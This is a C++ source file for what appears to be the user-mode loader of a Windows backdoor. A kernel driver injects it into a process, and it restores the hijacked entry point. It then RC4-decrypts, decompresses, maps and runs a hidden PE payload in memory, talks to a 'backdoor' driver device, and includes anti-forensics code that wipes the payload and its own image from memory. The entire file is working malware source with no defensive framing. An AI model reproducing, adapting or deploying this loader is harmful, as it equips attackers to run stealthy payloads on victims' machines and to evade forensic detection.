#include "stdafx.h"

extern "C" PVOID MainProc(void);

// saved bytes area
UCHAR ep_data[INJECT_PATCH_SIZE];

PPAYLOAD_HEADER m_Payload = NULL;
DWORD m_dwPayloadSize = 0;
//--------------------------------------------------------------------------------------
BOOL BackdoorDeviceUnregister(void)
{
    BOOL bRet = FALSE;
    WCHAR szDevicePath[MAX_PATH];

    wcscpy(szDevicePath, L"\\\\.\\" BACKDOOR_DEVICE_NAME);

    // open backdoor kernel driver device
    HANDLE hDevice = CreateFileW(
        szDevicePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL
    );
    if (hDevice != INVALID_HANDLE_VALUE)
    {
        DWORD dwBytes = 0;
        BACKDOOR_DEVICE_REQUEST Request, Reply;

        ZeroMemory(&Reply, sizeof(Reply));
        ZeroMemory(&Request, sizeof(Request));
        Request.Code = BACKDOOR_CTL_UNREGISTER;

        // make device request
        if (!(bRet = DeviceIoControl(
            hDevice, BACKDOOR_IOCTL_REQUEST,
            &Request, sizeof(Request), &Reply, sizeof(Reply), &dwBytes, NULL)))
        {
            DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
        }

        CloseHandle(hDevice);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
PVOID RestoreProcessModuleEntry(void)
{
    HMODULE hModule = (HMODULE)I_GetModuleHandleA(NULL);
    
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);    

    DWORD dwEntryPointRva = pHeaders->OptionalHeader.AddressOfEntryPoint;

    if (dwEntryPointRva > 0)
    {
        DWORD dwOldProtect = 0;
        PVOID EntryPoint = RVATOVA(hModule, dwEntryPointRva);        

        if (I_VirtualProtect(EntryPoint, INJECT_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            // restore original bytes at entry point
            std_memcpy(EntryPoint, &ep_data, INJECT_PATCH_SIZE);

            I_VirtualProtect(EntryPoint, INJECT_PATCH_SIZE, dwOldProtect, &dwOldProtect);

            return EntryPoint;
        }
    }        

    return NULL;
}
//--------------------------------------------------------------------------------------
typedef BOOL (WINAPI * DLL_MAIN)(
    PVOID hinstDLL,
    ULONG fdwReason,
    PVOID lpvReserved
);

BOOL LoadPayload(PVOID Data, DWORD dwDataSize, PVOID *pImage, DLL_MAIN *pEntry)
{
    BOOL bRet = FALSE;

    *pImage = NULL;
    *pEntry = NULL;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);

    if (pHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
    {
        
#ifdef _X86_

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported machine type\n");
        return FALSE;
#endif

    }        
    else if (pHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {

#ifdef _AMD64_

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported machine type\n");
        return FALSE;
#endif
        
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unsupported machine type\n");
        return FALSE;
    }

    PVOID Image = NULL;
    DWORD dwImageSize = 0;

    // map image into the memory
    if (!LdrImageFromData(Data, dwDataSize, &Image, &dwImageSize))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrImageFromData() fails\n");
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image address is "IFMT"\n", Image);        

    // parse relocations and imports
    if (LdrProcessRelocs(Image, Image))
    {
        if (RuntimeProcessImports(Image))
        {
            // set proper memory protection on image sections
            ImageFixSectionsProtection(Image);

            if (pHeaders->OptionalHeader.AddressOfEntryPoint != 0)
            {
                *pEntry = (DLL_MAIN)RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);                    

                DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image entry point is "IFMT"\n", *pEntry);
            }
                
            *pImage = Image;
            bRet = TRUE;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RuntimeProcessImports() fails\n");
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrProcessRelocs() fails\n");
    }

    if (!bRet)
    {
        // unsuccessful, free image memory
        VirtualFree(Image, 0, MEM_RELEASE);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
DWORD WINAPI MainThread(LPVOID lpParam)
{    
    DWORD dwPackedSize = m_dwPayloadSize - sizeof(PAYLOAD_HEADER), dwUnpackedSize = 0;    
    BOOL bSuccess = FALSE;

    PVOID Image = NULL;
    DLL_MAIN Entry = NULL;

    GET_NATIVE(RtlDecompressBuffer);

    if (f_RtlDecompressBuffer == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to obtain needed functions\n");
        return 0;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Compressed payload size is %d bytes\n", dwPackedSize);
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Decompressed payload size is %d bytes\n", m_Payload->UnpackedSize);

    RC4_CTX Ctx;

    // decrypt payload
    arc4_set_key(&Ctx, m_Payload->Key, PAYLOAD_KEY_LEN);
    arc4_crypt(&Ctx, m_Payload->Data, dwPackedSize);

    // allocate memory for uncompressed data
    PVOID UnpackedData = M_ALLOC(m_Payload->UnpackedSize);
    if (UnpackedData)
    {
        // uncompress payload data
        NTSTATUS ns = f_RtlDecompressBuffer(
            P_COMPRESSION_FORMAT_LZNT1 | P_COMPRESSION_ENGINE_STANDARD,
            (PUCHAR)UnpackedData, m_Payload->UnpackedSize,
            (PUCHAR)m_Payload->Data, dwPackedSize, &dwUnpackedSize
        );

        if (NT_SUCCESS(ns))
        {
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)UnpackedData;

            // sanity check
            if (dwUnpackedSize > sizeof(IMAGE_DOS_HEADER) && DosHeader->e_magic == IMAGE_DOS_SIGNATURE)
            {
                // load payload image
                bSuccess = LoadPayload(UnpackedData, dwUnpackedSize, &Image, &Entry);
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Invalid payload\n");
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RtlDecompressBuffer() fails\n");
        }

        ZeroMemory(UnpackedData, m_Payload->UnpackedSize);
        M_FREE(UnpackedData);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
    }

#ifdef USE_ANTI_FORENSICS

    DWORD dwOldProt = 0;    

    // remove executable perotection from the payload memory
    if (!VirtualProtect(m_Payload, m_dwPayloadSize, PAGE_READWRITE, &dwOldProt))
    {
        DbgMsg(__FILE__, __LINE__, "VirtualProtect() ERROR %d\n", GetLastError());
    }

    // erase payload from the memory
    ZeroMemory(m_Payload, m_dwPayloadSize);

#endif

    if (bSuccess && Entry)
    {
        Sleep(LOADER_START_SLEEP * 1000);

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Executing payload...\n");

        // eecute payload
        if (!Entry(Image, DLL_PROCESS_ATTACH, NULL))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DLL main returned FALSE\n");
        }
    }

    // unregister driver device in case if it wasn't done by the payload
    BackdoorDeviceUnregister();

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): EXIT\n");

    return 0;
}
//--------------------------------------------------------------------------------------
void Main(PVOID Image)
{   
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    char szProcessModule[MAX_PATH];

    memset(szProcessModule, 0, sizeof(szProcessModule));
    GetModuleFileName(GetModuleHandle(NULL), szProcessModule, MAX_PATH);
    
    DbgMsg(
        __FILE__, __LINE__, __FUNCTION__ "(): Loader injected into the '%s' (PID: %d)\n", 
        szProcessModule, GetCurrentProcessId()
    );

    PBACKDOOR_PAYLOAD pPayload = BACKDOOR_PAYLOAD_INFO(Image);

    // check if we have any payload to execute
    if (pPayload->Offset != 0 && pPayload->Size != 0)
    {
        m_Payload = (PPAYLOAD_HEADER)RVATOVA(Image, pPayload->Offset);
        m_dwPayloadSize = pPayload->Size;        

        // run payload in separate thread
        HANDLE hThread = CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__ "(): Payload is not present\n");

        // unregister driver device
        BackdoorDeviceUnregister();
    }

#ifdef USE_ANTI_FORENSICS

    ImageWipe(Image);

#endif

}
//--------------------------------------------------------------------------------------
PVOID MainProc(void)
{       
    PVOID Image = RuntimeGetBase();

    if (RuntimeInitialize(Image, FALSE))
    {
        /** safe to use imported functions here **/

        // we are injected into some process from kernel mode driver
        Main(Image);
    }    

    // restore proces entry point and return its address
    return RestoreProcessModuleEntry();
}
//--------------------------------------------------------------------------------------
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdreason, LPVOID lpvReserved)
{
    switch (fwdreason)
    {
    case DLL_PROCESS_ATTACH:
        {
            // run main code
            Main(hinstDLL);
            break;
        }

    case DLL_PROCESS_DETACH:
        {
            break;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF 
